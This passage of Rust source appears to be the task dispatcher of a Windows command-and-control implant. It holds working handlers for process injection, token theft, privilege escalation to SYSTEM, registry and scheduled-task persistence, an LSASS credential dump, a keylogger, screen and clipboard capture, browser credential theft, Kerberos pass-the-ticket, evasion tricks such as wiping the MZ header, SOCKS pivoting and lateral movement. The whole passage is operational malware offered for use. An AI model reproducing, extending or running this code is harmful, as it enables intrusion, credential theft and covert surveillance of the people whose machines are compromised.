                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_APC requires {\"pid\":N}"); return; }
            let r = unsafe { inject_apc(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "DOTNET_EXEC" => {
            let j = serde_json::from_str::<serde_json::Value>(&task.args).unwrap_or_default();
            let b64 = j.get("asm").and_then(|v| v.as_str()).unwrap_or("");
            if b64.is_empty() { t.send_result(task.id, "", "DOTNET_EXEC: missing asm field"); return; }
            let asm_bytes = match STANDARD.decode(b64) {
                Ok(v) => v,
                Err(e) => { t.send_result(task.id, "", &format!("b64 decode: {}", e)); return; }
            };
            let asm_args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let r = crate::dotnet::fork_run_assembly(&asm_bytes, &asm_args);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_STEAL" => {
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
            let r = unsafe { token_steal(pid) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_MAKE" => {
            let (user_s, domain_s, pass_s);
            if task.args.trim_start().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                user_s   = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_string();
                domain_s = j.get("domain").and_then(|v| v.as_str()).unwrap_or(".").to_string();
                pass_s   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_string();
            } else {
                // "domain\user pass" or "user pass"
                let sp = task.args.find(' ').unwrap_or(task.args.len());
                let domuser = &task.args[..sp];
                pass_s = if sp < task.args.len() { task.args[sp+1..].to_string() } else { String::new() };
                if let Some(bs) = domuser.find('\\') {
                    domain_s = domuser[..bs].to_string();
                    user_s   = domuser[bs+1..].to_string();
                } else {
                    domain_s = ".".to_string();
                    user_s   = domuser.to_string();
                }
            }
            if user_s.is_empty() || pass_s.is_empty() {
                t.send_result(task.id, "", "TOKEN_MAKE requires user+pass"); return;
            }
            let r = unsafe { token_make(&user_s, &domain_s, &pass_s) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_DROP" | "REV2SELF" => {
            unsafe { RevertToSelf(); }
            t.send_result(task.id, "[+] reverted to original token", "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_WHOAMI" => {
            t.send_result(task.id, &shell("whoami 2>&1"), "");
        }
        #[cfg(target_os = "windows")]
        "GETSYSTEM" => {
            let r = unsafe { get_system() };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "PERSIST" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("Updater");
            let cmd2 = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if cmd2.is_empty() { t.send_result(task.id, "", "PERSIST requires cmd"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /create /tn \"{}\" /tr \"{}\" /sc ONLOGON /ru SYSTEM /f 2>&1", name, cmd2))
            } else {
                shell(&format!("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /t REG_SZ /d \"{}\" /f 2>&1", name, cmd2))
            };
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "PERSIST_RM" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if name.is_empty() { t.send_result(task.id, "", "PERSIST_RM requires name"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /delete /tn \"{}\" /f 2>&1", name))
            } else {
                shell(&format!("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /f 2>&1", name))
            };
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "REG_QUERY" => {
            t.send_result(task.id, &shell(&format!("reg query \"{}\" 2>&1", task.args)), "");
        }
        #[cfg(target_os = "windows")]
        "REG_LIST" => {
            t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", task.args)), "");
        }
        #[cfg(target_os = "windows")]
        "REG_SET" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let typ2 = j.get("type").and_then(|v| v.as_str()).unwrap_or("REG_SZ");
            let val  = j.get("value").and_then(|v| v.as_str()).unwrap_or("");
            let out  = shell(&format!("reg add \"{}\" /v \"{}\" /t {} /d \"{}\" /f 2>&1", path, name, typ2, val));
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "REG_DELETE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let cmd2 = if name.is_empty() {
                format!("reg delete \"{}\" /f 2>&1", path)
            } else {
                format!("reg delete \"{}\" /v \"{}\" /f 2>&1", path, name)
            };
            t.send_result(task.id, &shell(&cmd2), "");
        }
        #[cfg(target_os = "windows")]
        "PORT_SCAN" => {
            let (host, ports, timeout) = if task.args.trim_start().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                (
                    j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1").to_string(),
                    j.get("ports").and_then(|v| v.as_str()).unwrap_or("80,443,445,3389").to_string(),
                    j.get("timeout").and_then(|v| v.as_u64()).unwrap_or(500),
                )
            } else {
                let parts: Vec<&str> = task.args.split_whitespace().collect();
                let h = parts.get(0).copied().unwrap_or("127.0.0.1").to_string();
                let p = parts.get(1).copied().unwrap_or("80,443,445,3389").to_string();
                let t_ms = parts.get(2).and_then(|s| s.parse::<u64>().ok()).unwrap_or(500);
                (h, p, t_ms)
            };
            let script = format!(
                "$h='{}';$t={};'{}'.Split(',') | ForEach-Object {{ $p=[int]$_;\
                $s=New-Object System.Net.Sockets.TcpClient;\
                $a=$s.BeginConnect($h,$p,$null,$null);\
                if($a.AsyncWaitHandle.WaitOne($t)){{if($s.Connected){{'OPEN '+$h+':'+$p}};$s.Close()}} }}",
                host, timeout, ports
            );
            let out = ps(&script);
            t.send_result(task.id, if out.trim().is_empty() { "no open ports" } else { &out }, "");
        }
        #[cfg(target_os = "windows")]
        "MINIDUMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\Windows\\Temp\\1.dmp");
            let script = format!(
                "$p=(Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '{}' full",
                path
            );
            let out = ps(&script);
            if out.trim().is_empty() {
                t.send_result(task.id, &format!("[+] dump written to {}", path), "");
            } else {
                t.send_result(task.id, &out, "");
            }
        }
        #[cfg(target_os = "windows")]
        "PPID" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let cmd2   = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let parent = j.get("parent").and_then(|v| v.as_str()).unwrap_or("explorer.exe");
            if cmd2.is_empty() { t.send_result(task.id, "", "PPID requires {\"cmd\":\"...\"}"); return; }
            let r = unsafe { spawn_with_ppid(cmd2, parent) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "HWBP_CLEAR" => {
            use windows_sys::Win32::System::Threading::{GetCurrentThreadId, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
            let r = unsafe {
                let tid = GetCurrentThreadId();
                let ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 0, tid);
                if ht == 0 {
                    format!("OpenThread failed (err {})", GetLastError())
                } else {
                    let mut ctx: CONTEXT = std::mem::zeroed();
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
                    if GetThreadContext(ht, &mut ctx) != 0 {
                        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0;
                        ctx.Dr6 = 0; ctx.Dr7 = 0;
                        SetThreadContext(ht, &ctx);
                    }
                    CloseHandle(ht);
                    "[+] hardware breakpoints cleared".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "WIPE_MZ" => {
            let r = unsafe {
                let base = GetModuleHandleW(std::ptr::null()) as *mut u8;
                if base.is_null() {
                    format!("GetModuleHandleW failed (err {})", GetLastError())
                } else {
                    let mut old = 0u32;
                    VirtualProtect(base as *const _, 2, PAGE_READWRITE, &mut old);
                    *base = 0;
                    *base.add(1) = 0;
                    VirtualProtect(base as *const _, 2, old, &mut old);
                    "[+] MZ header wiped".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_LIST" => {
            let r = kerberos::kerb_list_tickets();
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_PTT" => {
            let b64 = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok()
                .and_then(|v| v.get("ticket").and_then(|t| t.as_str()).map(String::from))
                .unwrap_or_default();
            if b64.is_empty() {
                t.send_result(task.id, "", "KERB_PTT requires {\"ticket\":\"<b64>\"}");
                return;
            }
            let r = kerberos::kerb_pass_ticket(&b64);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_PURGE" => {
            let r = kerberos::kerb_purge();
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "EXEC_PE" => {
            if task.payload.is_empty() {
                t.send_result(task.id, "", "EXEC_PE requires a PE payload");
                return;
            }
            let r = pe_exec::exec_pe(&task.payload);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "SCREENWATCH_START" => {
            let interval = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("interval").and_then(|v| v.as_u64()).unwrap_or(5)
            } else {
                task.args.trim().parse::<u64>().unwrap_or(5)
            };
            let agent_id = t.agent_id.clone();
            let aes_key  = t.aes_key.clone();
            spawn_screenwatch_thread(agent_id, aes_key, interval);
            t.send_result(task.id, "[+] screenwatch started", "");
        }
        #[cfg(target_os = "windows")]
        "SCREENWATCH_STOP" => {
            SCREENWATCH_STOP.store(true, Ordering::Relaxed);
            let handle = screenwatch_handle().take();
            if let Some(h) = handle { let _ = h.join(); }
            t.send_result(task.id, "[+] screenwatch stopped", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_START" => {
            keylog::keylog_start();
            t.send_result(task.id, "[+] keylogger started", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_STOP" => {
            keylog::keylog_stop();
            t.send_result(task.id, "[+] keylogger stopped", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_DUMP" => {
            let out = keylog::keylog_dump();
            t.send_result(task.id, if out.is_empty() { "[no keystrokes]" } else { &out }, "");
        }
        "SOCKS_START" => {
            let port = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("port").and_then(|v| v.as_u64()).unwrap_or(1080) as u16
            } else {
                task.args.trim().parse::<u16>().unwrap_or(1080)
            };
            match socks::socks_start(port) {
                Ok(_) => t.send_result(task.id, &format!("[+] SOCKS5 proxy started on port {}", port), ""),
                Err(e) => t.send_result(task.id, "", &e),
            }
        }
        "SOCKS_STOP" => {
            socks::socks_stop();
            t.send_result(task.id, "[+] SOCKS5 proxy stopped", "");
        }
        #[cfg(target_os = "windows")]
        "BROWSER_CREDS" => {
            let result = browser_creds::do_browser_creds();
            t.send_result(task.id, &result, "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_GET" => {
            t.send_result(task.id, &clipboard::clip_get(), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_START" => {
            let secs: u64 = task.args.trim().parse().unwrap_or(5);
            t.send_result(task.id, clipboard::clip_monitor_start(secs), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_DUMP" => {
            t.send_result(task.id, &clipboard::clip_monitor_dump(), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_STOP" => {
            t.send_result(task.id, clipboard::clip_monitor_stop(), "");
        }
        "RSOCKS_START" => {
            let port: u16 = task.args.trim().parse().unwrap_or(0);
            if port == 0 {
                t.send_result(task.id, "", "RSOCKS_START requires a callback port number");
            } else {
                t.send_result(task.id, &rsocks::rsocks_start(port), "");
            }
        }
        "RSOCKS_STOP" => {
            t.send_result(task.id, rsocks::rsocks_stop(), "");
        }
        "HTTP_PIVOT_START" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            if port == 0 {
                t.send_result(task.id, "", "HTTP_PIVOT_START requires {port:N}");
            } else {
                http_pivot::set_http_pivot_agent_id(&t.agent_id);
                t.send_result(task.id, &http_pivot::start_http_pivot(port), "");
            }
        }
        "HTTP_PIVOT_STOP" => {
            t.send_result(task.id, http_pivot::stop_http_pivot(), "");
        }
        "TCP_PIVOT_START" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            if port == 0 {
                t.send_result(task.id, "", "TCP_PIVOT_START requires {port:N}");
            } else {
                tcp_pivot::set_tcp_pivot_agent_id(&t.agent_id);
                t.send_result(task.id, &tcp_pivot::start_tcp_pivot(port), "");
            }
        }
        "TCP_PIVOT_STOP" => {
            t.send_result(task.id, tcp_pivot::stop_tcp_pivot(), "");
        }
        "BOF" => {
            #[cfg(target_os = "windows")]
            {
                use base64::Engine as _;
                let args_obj: serde_json::Value = serde_json::from_str(task.args.as_str())
                    .unwrap_or_default();
                let coff_b64 = args_obj["coff_b64"].as_str().unwrap_or("");
                let args_b64 = args_obj["args_b64"].as_str().unwrap_or("");
                let coff = base64::engine::general_purpose::STANDARD
                    .decode(coff_b64)
                    .unwrap_or_default();
                let packed = base64::engine::general_purpose::STANDARD
                    .decode(args_b64)
                    .unwrap_or_default();
                match crate::bof::exec_bof(&coff, &packed) {
                    Ok(out) => t.send_result(task.id, &out, ""),
                    Err(e)  => t.send_result(task.id, "", &e),
                }
            }
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, "", "BOF not supported on this platform");
        }
        "LATERAL" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let method       = j["method"].as_str().unwrap_or("atexec").to_string();
            let host         = j["host"].as_str().unwrap_or("").to_string();
            let user         = j["user"].as_str().unwrap_or("").to_string();
            let pass         = j["pass"].as_str().unwrap_or("").to_string();
            let cmd          = j["cmd"].as_str().unwrap_or("").to_string();
            let payload_name = j["payload"].as_str().unwrap_or("").to_string();
            let data: Vec<u8> = if !payload_name.is_empty() {
                t.download_file(&payload_name)
            } else if !cmd.is_empty() {
                std::fs::read(&cmd).unwrap_or_default()
            } else {
                vec![]
            };
            match crate::lateral::run_lateral(&method, &host, &data, &cmd, &user, &pass) {
                Ok(out)  => t.send_result(task.id, &out, ""),
                Err(err) => t.send_result(task.id, "", &err),
            }
        }
        _ => {
            // Delegate to feature modules
            #[cfg(target_os = "windows")]
            if commands_injection::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_tokens::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_defense::dispatch(t, task) { return; }
            #[cfg(target_os = "windows")]
            if commands_utils::dispatch(t, task) { return; }
            if commands_ishell::dispatch(t, task)  { return; }
            t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
        }
    }
}
